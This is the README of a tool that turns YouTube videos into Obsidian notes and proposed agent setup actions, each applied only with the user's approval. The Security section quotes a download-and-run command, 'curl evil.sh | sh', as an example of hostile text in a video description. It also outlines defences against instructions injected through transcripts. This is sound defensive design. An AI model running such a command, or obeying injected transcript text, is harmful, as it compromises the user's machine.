# Self-Learning Agent

**Point your coding agent at a video. Get a note you'll keep, and a setup you approved.**

> **Status: v1 complete, plus channel triage (M5).** `/learn-from <url>` produces a
> vault note with validated proposals; `/learn-from @channel` triages a creator's
> latest uploads for you to pick from; `sla apply` reviews proposals one at a time
> behind a SkillSpector scan. Nothing is ever applied without you saying yes.
> 379 tests, 91% coverage, CI on Linux, macOS and Windows across Python
> 3.10–3.13. Architecture is in
> [PLAN.md](https://github.com/Soham-1827/Self-Learning-Agent-Claude/blob/main/PLAN.md); to pick the work up cold, read [HANDOVER.md](https://github.com/Soham-1827/Self-Learning-Agent-Claude/blob/main/HANDOVER.md).

---

## The problem

Creators like [Greg Isenberg](http://youtube.com/@GregIsenberg) ship videos about
building with AI agents faster than anyone can absorb them — which MCP server to use,
which repo to clone, which prompting pattern actually works. The advice is good. The
throughput is the problem.

By the time you need a technique, you've forgotten which video it was in, and you
definitely haven't set it up.

This turns that firehose into two things you can use: **a note in your vault**, and
**a list of setup actions you explicitly approve**.

Before installing anything, read what it actually produces:
**[six real notes, unedited, in `examples/`](https://github.com/Soham-1827/Self-Learning-Agent-Claude/tree/main/examples)**.

## What it does

```bash
/learn-from https://youtube.com/watch?v=...   # one video
/learn-from @GregIsenberg                     # a channel: triage, you pick, one digest
```

Or from a shell:

```bash
sla queue "@handle" --last 10        # triage a channel from metadata only
sla brief "<url>" --out brief.json   # gather one video
sla note  "<url>" --synthesis s.json # render its note
sla digest <id> <id> ...             # one note linking a processed batch
sla apply "<url>"                    # review proposals, one at a time
sla doctor                           # check the install and report any skew
```

It pulls the transcript, description, and chapters; checks what you already have
installed; writes an Obsidian note; and — only if you approve, item by item —
installs and configures what's worth having.

### It knows what you already own

Before writing anything, the pipeline inventories your installed skills, MCP servers,
and CLIs. So the note says:

> Video recommends Playwright MCP — **you already have it**. The new part is the
> selector-retry pattern it demonstrates, which is worth adding as a skill.

instead of handing you a list of things you installed months ago. It gets *sharper*
the more you already have, not noisier.

### Two kinds of video, two payoffs

The pipeline classifies the source and shifts the weight of the note accordingly:

| Class | Example | What you get |
|---|---|---|
| **tooling** | "I built this with Claude Code and 3 MCP servers" | Concrete setup actions, ready to approve |
| **conceptual** | "5 AI business ideas for 2026" | Developed project ideas — stack, first command, honest time estimate |
| **mixed** | Both | Both |

For a conceptual video there is usually **nothing to install, and it says so.**
Which brings us to the design rule that matters most:

### It's allowed to find nothing

Most videos teach nothing installable. If a tool like this is *expected* to produce
actions, it will manufacture them — and that is precisely what makes these tools
untrustworthy. `proposals: []` is a valid, common, correct output here.

Same reason every note carries a mandatory **Gaps & uncertainty** section: videos demo
things on screen while the audio says "just paste this in here," and auto-captions
mangle the exact words that matter (`MCP` → `mcp`, `n8n` → `an eight n`). The note
tells you what it couldn't see rather than papering over it.

## Security

This tool reads text written by strangers and can install software. That deserves a
real answer, not a disclaimer.

**The agent never emits a shell command.** A proposal can only name a package on a
known registry:

```json
{ "kind": "package", "manager": "npm", "name": "@playwright/mcp" }
```

The Python layer renders the command from a template. There is no path from transcript
text to `bash` — a video description containing `curl evil.sh | sh` cannot become an
executed command, because "a command" is not something a proposal is able to express.

**Agent-facing content is scanned before it activates.** Skills are staged in the repo,
scanned with [SkillSpector](https://github.com/NVIDIA/skillspector), and only copied
into your skills directory if you approve. A scan that could not fully run is reported
as weak evidence, never as a pass.

On top of that:

- **Risk tiers.** Anything off the allowlist, anything needing a secret, anything
  cloned-and-run is tier `high` — printed as manual instructions, **never** automated.
- **Secrets are never handled.** If a tool needs an API key, you get the key *name* in
  a `.env` stub. No value is ever read, written, or transmitted.
- **Every action is reversible.** Each applied proposal records its own undo command.
- **Nothing outside your vault is touched before you approve.**

Full model in [PLAN.md §8](https://github.com/Soham-1827/Self-Learning-Agent-Claude/blob/main/PLAN.md). The adversarial-transcript test suite is the one
that isn't allowed to go red.

## Install

Two pieces: the `sla` CLI, and the Claude Code plugin that gives you `/learn-from`.

```bash
# 1. the CLI  (Python 3.10+; installs sla onto your PATH)
uv tool install git+https://github.com/Soham-1827/Self-Learning-Agent-Claude.git

# 2. the plugin  (the /learn-from command and the skill behind it)
claude plugin marketplace add Soham-1827/Self-Learning-Agent-Claude
claude plugin install self-learning-agent@self-learning-agent
```

Inside a session you can do step 2 as `/plugin marketplace add
Soham-1827/Self-Learning-Agent-Claude` followed by `/plugin install
self-learning-agent`. Restart the session afterwards so the skill loads.

Update later with `uv tool upgrade self-learning-agent` and `claude plugin update
self-learning-agent`. **Do not copy `skills/` and `commands/` into `~/.claude/`
by hand** — a copy has no update path, goes stale silently, and will keep teaching
a superseded procedure (PLAN §26).

Then point it at a vault, by writing `~/.self-learning-agent/config.json`:

```json
{ "vault_path": "~/LearningVault", "vault_subdir": "Sources", "install_mode": "copy" }
```

Defaults work without it: `~/LearningVault/Sources`, and `~/.self-learning-agent`
for the cache, ledger, and the staging folder where a proposed skill is written for
review before it can activate (D7). That folder is
`~/.self-learning-agent/generated-skills/` for an installed copy, or the checkout's
own `generated-skills/` when you run from source, so it stays diffable in git.
Override either with `SLA_HOME` or `generated_skills_path`.

### The scanner

Activating a generated skill is gated on a security scan by
[SkillSpector](https://github.com/NVIDIA/skillspector):

```bash
uv tool install git+https://github.com/NVIDIA/skillspector.git
export SKILLSPECTOR_PROVIDER=anthropic    # also: openai, ollama, bedrock, azure_openai
export ANTHROPIC_API_KEY=...              # ollama needs no key and runs locally
```

There are three honest states, and `sla apply` tells you which one you are in:

| | |
|---|---|
| no SkillSpector | skill proposals are **blocked** — "refusing to activate unscanned" |
| SkillSpector, no model credentials | static-only scan, reported as weak evidence |
| SkillSpector + a provider | `static + semantic`, the full scan |

Nothing else is gated this way. A scan blocks *activation*, never a download (§18),
and registry packages are never scanned — SkillSpector does not analyse them, and
`sla apply` says so rather than implying a clean bill of health.

### Check the install: `sla doctor`

Which of those three scanner states you are in — and whether anything else
disagrees with itself — is one command:

```
$ sla doctor
[ok  ] cli version            0.2.2
[ok  ] plugin version         0.2.2
[ok  ] hand-copied skill      none
[ok  ] yt-dlp                 2026.08.19
[ok  ] scanner                /home/you/.local/bin/skillspector (openai)
[ok  ] harness                claude-code
[ok  ] home                   /home/you/.self-learning-agent
[ok  ] vault                  /home/you/LearningVault/Sources
[ok  ] staged skills          /home/you/.self-learning-agent/generated-skills
[ok  ] install_mode           copy

everything checks out
```

It writes nothing, never prints a secret value, and exits non-zero only on a
`FAIL`. Every line exists because something shipped broken once: a hand-copied
skill that went stale for three weeks, a version-gated plugin cache, a staged
skill written inside the installed venv, and a CLI that misreported its own
version through two releases (PLAN §26, §28, §29). Each of those was silent;
each is now a line. Paste the output into a bug report.

### From source, for contributing

```bash
git clone https://github.com/Soham-1827/Self-Learning-Agent-Claude.git
cd Self-Learning-Agent-Claude
uv venv --python 3.12 .venv
uv pip install --python .venv/bin/python -e ".[dev]"
.venv/bin/python -m pytest
```

## Applying proposals

Writing a note installs nothing. Read the note, then:

```bash
sla apply "<url>" --dry-run     # scan and decide; change nothing
sla apply "<url>"               # scan, decide, then ask about each proposal
sla apply "<url>" --only p1     # a single proposal
```

Run it from a real terminal, since it prompts. For each proposal it prints the risk
tier, the exact command it would run, and the scan verdict, then decides:

| Decision | What happens |
|---|---|
| `confirm` | You are asked `[y/N]`. Anything other than `y` skips it. |
| `BLOCKED` | Never offered: off the allowlist, needs a secret, manual by nature, or a skill the scan says not to install. The command is printed for you instead. |

Saying yes does exactly one thing per kind:

| Kind | Effect |
|---|---|
| `skill` | Writes `~/.claude/skills/<name>/SKILL.md` with the content that was scanned |
| `repo_clone` | Clones into `~/.self-learning-agent/staging/` — nothing in it is executed |
| `package` | Installs with the allowlisted package manager |
| `mcp_server` | Adds an entry to your MCP config, after backing it up |

Every applied action is appended to the note's **Applied** section with its undo
command.

Worth knowing:

- **`CAUTION` is the ordinary verdict.** SkillSpector does not return `SAFE` from a
  static-only scan, even with zero findings.
- **Omit `--no-llm` for decisions that matter.** Semantic analysis needs a provider
  key (for example `SKILLSPECTOR_PROVIDER=openai` with `OPENAI_API_KEY`).
- **A skill is refused if its staged copy changed after the scan**, or if anything
  besides `SKILL.md` sits beside it. Run `sla apply` again to rescan.
- **`--yes` skips the prompts.** Blocked proposals still never run.
- **Applied proposals are not offered again**, and a video only shows as `applied`
  once nothing automatable is still waiting — otherwise it is `partial`.

## Working through a channel

```bash
sla queue "@GregIsenberg" --last 10
```

Triage reads metadata only — titles, dates, chapters, links in the description — and
never downloads a transcript. Videos you have already processed are left out. A real
run:

```
pick  #  id           published   min  ch  gh captions  ~words  guess              title
✓     1  _LCeJZFIsd4  2026-09-14   31  10   0 auto       4,722  likely tooling     Building a Software Factory that actually works…
✓     2  nglqTHwuZ-8  2026-09-10   23   7   0 manual     3,430  likely tooling     GPT-6 Astra: How I’d Make Money With It
✓     3  mUAsaprJ66s  2026-09-15   28   9   0 auto       4,125  likely conceptual  Instinct AI is For Real. What You Need to Know.
✓     4  UtFo1ZNC2ns  2026-09-08   39  18   0 auto       5,815  likely conceptual  I'm Obsessed With Local AI. Here's Why
```

Three of those columns carry a caveat, and the table states them rather than leaving
them to a footnote:

- **`guess`** is metadata only. Each video is classified for real when it is read.
- **`~words`** is duration × 150 wpm, never a counted transcript. A video with no
  captions shows `—`, because there is nothing there to estimate.
- **`captions`** is what YouTube lists — `manual`, `auto`, `none`, or `unknown` for a
  cache entry written before the check existed. A listed track can still fail to
  download; nothing here promises otherwise. Videos with no captions rank last: a
  pick is an instruction to read a transcript, and those have none to read.

You choose what gets processed — `/learn-from @handle` shows this table and
waits — and each pick then goes through the single-video flow on its own, one
transcript at a time. `sla digest` finishes with one note that links the batch and
gathers every proposal by risk tier.

## Design

```
PLAN phase — no side effects outside the vault
  resolve → dedupe → fetch → inventory → synthesize → write note
                        ↓
              ██ YOU REVIEW THE NOTE ██
                        ↓
APPLY phase — touches your machine
  gate → apply → record
```

Deterministic work (fetching, caching, deduping, rendering, guarded installs) is
tested Python. Judgment (classification, synthesis, authoring skills) is the agent.
The seam between them is a validated JSON contract, which is also what makes the
security model enforceable.

**No API keys required.** `yt-dlp` handles channel listings and captions anonymously.

## Roadmap

| | Milestone | |
|---|---|---|
| M0 | Repo skeleton, CI, license | ✅ |
| M1 | Fetch + cache + ledger | ✅ |
| M2 | Inventory of installed skills/MCPs | ✅ |
| M3 | `/learn-from` → vault note + proposals | ✅ |
| M4 | Approval gate + apply | ✅ |
| M5 | Channel triage + digest | ✅ |
| M6 | Scheduled polling | |
| M7 | Web frontend — paste any link | |

## What it looks like on real videos

**[Read the notes in `examples/`.](https://github.com/Soham-1827/Self-Learning-Agent-Claude/tree/main/examples)** Six videos, three creators, unedited —
plus the `proposals.json` files `sla apply` reads, so the security model is something
you can check rather than take on trust.

| Video | Class | Proposals | Ideas |
|---|---|---|---|
| [*Building a Software Factory*](https://github.com/Soham-1827/Self-Learning-Agent-Claude/blob/main/examples/notes/2026-09-14%20Building%20a%20Software%20Factory%20that%20actually%20works%20%28Full%20Course%29%20%28_LCeJZFIsd4%29.md) (Greg Isenberg) | `tooling` | 2 | 1 |
| [*WebMCP: Let AI Agents pay you money*](https://github.com/Soham-1827/Self-Learning-Agent-Claude/blob/main/examples/notes/2026-08-26%20WebMCP%20Let%20AI%20Agents%20pay%20you%20money%20%28EoNH3Tn8wYE%29.md) (Greg Isenberg) | `mixed` | 2 | 2 |
| [*5 GitHub Repos*](https://github.com/Soham-1827/Self-Learning-Agent-Claude/blob/main/examples/notes/2026-09-02%205%20GitHub%20Repos%20Kill%20AI%20Slop%2C%20Go%20Viral%2C%20Make%20Money%20%289_SZFIW7tus%29.md) (Greg Isenberg) | `tooling` | 3 | 2 |
| [*Meta Muse AI Connectors*](https://github.com/Soham-1827/Self-Learning-Agent-Claude/blob/main/examples/notes/2026-09-24%20Meta%20Muse%20AI%20Connectors%20The%20App%20Store%20for%20AI%20%2884q4WA3kA8Q%29.md) (Greg Isenberg) | `conceptual` | **0** | 4 |
| [*How to beat low stakes poker*](https://github.com/Soham-1827/Self-Learning-Agent-Claude/blob/main/examples/notes/2026-06-25%20How%20to%20beat%20low%20stakes%20poker%21%20%28Every%20Strategy%29%20%28gPPT4WpVRZ4%29.md) (BlackRain79Poker) | `conceptual` | **0** | 2 |
| [*How the Periodic Table Works*](https://github.com/Soham-1827/Self-Learning-Agent-Claude/blob/main/examples/notes/2026-09-03%20Neil%20deGrasse%20Tyson%20Explains%20How%20the%20Periodic%20Table%20Works%20%28UpE5yuhwXXc%29.md) (StarTalk) | `conceptual` | **0** | 1 |

Half of them proposed nothing. The *Meta Muse* video is about AI connectors and the
channel triage guessed `likely tooling` from its description — the note classified it
`conceptual`, proposed nothing, said the guess was wrong, and spent its length on four
project ideas instead. The poker and periodic-table videos have no chapters, no GitHub
links, and nothing installable. They still produce notes worth keeping.

That is the design working, not failing. Also in `examples/`: the
[digest](https://github.com/Soham-1827/Self-Learning-Agent-Claude/blob/main/examples/notes/2026-09-25%20Digest%20-%20Greg%20Isenberg.md) that closed the
`@GregIsenberg` channel run — ten videos triaged, three picked, and the Software
Factory, WebMCP and Meta Muse notes written from them.

## Known limitations

1. **Screen content is lost.** Frame sampling with vision is deferred as too expensive
   for v1; description links cover most of the gap.
2. **ASR mangles product names.** Mitigated by reading the human-typed description, not
   solved. Low-confidence names are flagged in the note.
3. **No members-only or paywalled content.**
4. **YouTube refuses some caption tracks outright.** A request for the translated `en`
   auto-caption track returns `HTTP 429` indefinitely, while `en-orig` — the same speech,
   served as the video's own language — downloads normally. The pipeline asks for one
   track at a time, prefers `en-orig`, and falls through to the next track when one is
   refused (PLAN §25). Genuine volume limits are retried with backoff, tunable via
   `ytdlp_attempts` and `ytdlp_backoff_seconds` in `config.json`. Nothing is ever cached
   on a failure, so a failed read can simply be run again.
5. **Quality is bounded by the creator.** This faithfully relays what a video claims.
   It does not independently verify that the advice is any good.

## Contributing

Releases follow [RELEASING.md](https://github.com/Soham-1827/Self-Learning-Agent-Claude/blob/main/RELEASING.md) — a version is declared in
three files and must agree in all of them; missing one caused two of the bugs in
PLAN §28–§29.

Early — the most useful contribution right now is disagreement with
[PLAN.md](https://github.com/Soham-1827/Self-Learning-Agent-Claude/blob/main/PLAN.md). Open an issue.

Transcript fixtures for the test suite are the highest-value contribution —
especially adversarial ones, and sources that break the assumptions in PLAN.md §19–§20.

## License

MIT
